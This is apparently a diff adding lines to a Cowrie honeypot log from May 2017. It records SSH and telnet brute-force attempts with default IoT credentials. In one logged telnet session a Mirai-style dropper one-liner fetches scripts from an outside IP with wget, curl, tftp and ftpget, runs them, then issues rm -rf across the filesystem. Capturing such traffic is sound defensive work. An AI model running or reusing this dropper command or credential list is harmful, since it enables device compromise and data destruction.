@@ -6656,3 +6656,97 @@
 2017-05-10T03:37:50+0000 [CowrieTelnetTransport,54564,46.119.4.249] Received unhandled keyID: '\x00'
 2017-05-10T03:37:50+0000 [CowrieTelnetTransport,54564,46.119.4.249] CMD: /bin/busybox MIRAI
 2017-05-10T03:37:50+0000 [CowrieTelnetTransport,54564,46.119.4.249] Command found: /bin/busybox MIRAI
+2017-05-10T03:38:01+0000 [CowrieTelnetTransport,54563,189.24.10.81] Closing TTY Log: log/tty/20170510-033619-None-54563i.log after 101 seconds
+2017-05-10T03:38:01+0000 [CowrieTelnetTransport,54563,189.24.10.81] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-10T03:38:01+0000 [CowrieTelnetTransport,54563,189.24.10.81] Connection lost after 105 seconds
+2017-05-10T03:38:01+0000 [CowrieTelnetTransport,54564,46.119.4.249] Closing TTY Log: log/tty/20170510-033732-None-54564i.log after 29 seconds
+2017-05-10T03:38:01+0000 [CowrieTelnetTransport,54564,46.119.4.249] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-10T03:38:01+0000 [CowrieTelnetTransport,54564,46.119.4.249] Connection lost after 46 seconds
+2017-05-10T03:38:06+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:51476 (10.8.41.81:2222) [session: 04be9a8c]
+2017-05-10T03:38:06+0000 [HoneyPotSSHTransport,77807,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-10T03:38:06+0000 [HoneyPotSSHTransport,77807,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-10T03:38:06+0000 [HoneyPotSSHTransport,77807,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-10T03:38:06+0000 [HoneyPotSSHTransport,77807,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-10T03:38:06+0000 [HoneyPotSSHTransport,77807,130.206.99.99] NEW KEYS
+2017-05-10T03:38:07+0000 [HoneyPotSSHTransport,77807,130.206.99.99] starting service 'ssh-userauth'
+2017-05-10T03:38:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77807,130.206.99.99] 'desktop' trying auth 'password'
+2017-05-10T03:38:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77807,130.206.99.99] login attempt: 8289
+2017-05-10T03:38:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77807,130.206.99.99] login return, expect: [aa/123456]
+2017-05-10T03:38:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77807,130.206.99.99] login attempt [desktop/desk] failed
+2017-05-10T03:38:09+0000 [-] 'desktop' failed auth 'password'
+2017-05-10T03:38:09+0000 [-] unauthorized login: 
+2017-05-10T03:38:09+0000 [HoneyPotSSHTransport,77807,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-10T03:38:09+0000 [HoneyPotSSHTransport,77807,130.206.99.99] connection lost
+2017-05-10T03:38:09+0000 [HoneyPotSSHTransport,77807,130.206.99.99] Connection lost after 3 seconds
+2017-05-10T03:38:17+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 82.118.242.174:44112 (10.8.41.81:2223) [session: TT54566]
+2017-05-10T03:38:18+0000 [CowrieTelnetTransport,54566,82.118.242.174] login attempt: 1112
+2017-05-10T03:38:18+0000 [CowrieTelnetTransport,54566,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:38:18+0000 [CowrieTelnetTransport,54566,82.118.242.174] login attempt [admin/meinsm] succeeded
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Opening TTY Log: log/tty/20170510-033820-None-54566i.log
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] CMD: sh
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: sh 
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: cd /tmp
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: cd /var/run
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: cd /mnt
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: cd /root
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: cd /
+2017-05-10T03:38:20+0000 [CowrieTelnetTransport,54566,82.118.242.174] Command found: wget http://82.118.242.175/bins.sh
+2017-05-10T03:38:20+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://82.118.242.175/bins.sh>
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Not storing duplicate content e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Downloaded URL (http://82.118.242.175/bins.sh) with SHA-256 e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f to dl/e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: curl -O http://82.118.242.175/bins.sh
+2017-05-10T03:38:20+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://82.118.242.175/bins.sh>
+2017-05-10T03:38:20+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://82.118.242.175/bins.sh>
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Not storing duplicate content e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Downloaded URL (http://82.118.242.175/bins.sh) with SHA-256 e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f to dl/e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bins.sh
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: sh /bins.sh
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: tftp 82.118.242.175 -c get tftp1.sh
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-05-10T03:38:20+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 82.118.242.175
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://82.118.242.175/ftp1.sh) with SHA-256 a9c31b1f86b9cfa273aedbded0f60610f73d6c542ec30909d3dab463b5b7dfad to dl/a9c31b1f86b9cfa273aedbded0f60610f73d6c542ec30909d3dab463b5b7dfad
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Command found: sh /ftp1.sh
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Command found: rm -rf /bins.sh tftp1.sh tftp2.sh /ftp1.sh
+2017-05-10T03:38:21+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-10T03:38:21+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://82.118.242.175/bins.sh>
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] Not storing duplicate content e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] Saved redir contents with SHA-256 e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f to dl/e937fa57946955fec34f573fc4299363ced8ce33866abab6293f995e5d41344f
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] Not storing duplicate content a9c31b1f86b9cfa273aedbded0f60610f73d6c542ec30909d3dab463b5b7dfad
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] Saved redir contents with SHA-256 a9c31b1f86b9cfa273aedbded0f60610f73d6c542ec30909d3dab463b5b7dfad to dl/a9c31b1f86b9cfa273aedbded0f60610f73d6c542ec30909d3dab463b5b7dfad
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] Closing TTY Log: log/tty/20170510-033820-None-54566i.log after 14 seconds
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-10T03:38:34+0000 [CowrieTelnetTransport,54566,82.118.242.174] Connection lost after 17 seconds
+2017-05-10T03:38:44+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:32948 (10.8.41.81:2222) [session: 761a929c]
+2017-05-10T03:38:44+0000 [HoneyPotSSHTransport,77808,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-10T03:38:44+0000 [HoneyPotSSHTransport,77808,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-10T03:38:44+0000 [HoneyPotSSHTransport,77808,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-10T03:38:44+0000 [HoneyPotSSHTransport,77808,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-10T03:38:44+0000 [HoneyPotSSHTransport,77808,130.206.99.99] NEW KEYS
+2017-05-10T03:38:45+0000 [HoneyPotSSHTransport,77808,130.206.99.99] starting service 'ssh-userauth'
+2017-05-10T03:38:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77808,130.206.99.99] 'desktop' trying auth 'password'
+2017-05-10T03:38:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77808,130.206.99.99] login attempt: 8290
+2017-05-10T03:38:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77808,130.206.99.99] login return, expect: [aa/123456]
+2017-05-10T03:38:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77808,130.206.99.99] login attempt [desktop/desktop] failed
+2017-05-10T03:38:49+0000 [-] 'desktop' failed auth 'password'
+2017-05-10T03:38:49+0000 [-] unauthorized login: 
+2017-05-10T03:38:49+0000 [HoneyPotSSHTransport,77808,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-10T03:38:49+0000 [HoneyPotSSHTransport,77808,130.206.99.99] connection lost
+2017-05-10T03:38:49+0000 [HoneyPotSSHTransport,77808,130.206.99.99] Connection lost after 4 seconds
+2017-05-10T03:38:59+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 82.118.242.174:52056 (10.8.41.81:2223) [session: TT54567]
+2017-05-10T03:38:59+0000 [CowrieTelnetTransport,54567,82.118.242.174] login attempt: 1113
+2017-05-10T03:38:59+0000 [CowrieTelnetTransport,54567,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:39:00+0000 [CowrieTelnetTransport,54567,82.118.242.174] login attempt [root/xc3511] failed
+2017-05-10T03:39:00+0000 [CowrieTelnetTransport,54567,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:39:01+0000 [CowrieTelnetTransport,54567,82.118.242.174] login attempt: 1114
+2017-05-10T03:39:01+0000 [CowrieTelnetTransport,54567,82.118.242.174] login return, expect: [admin/meinsm]
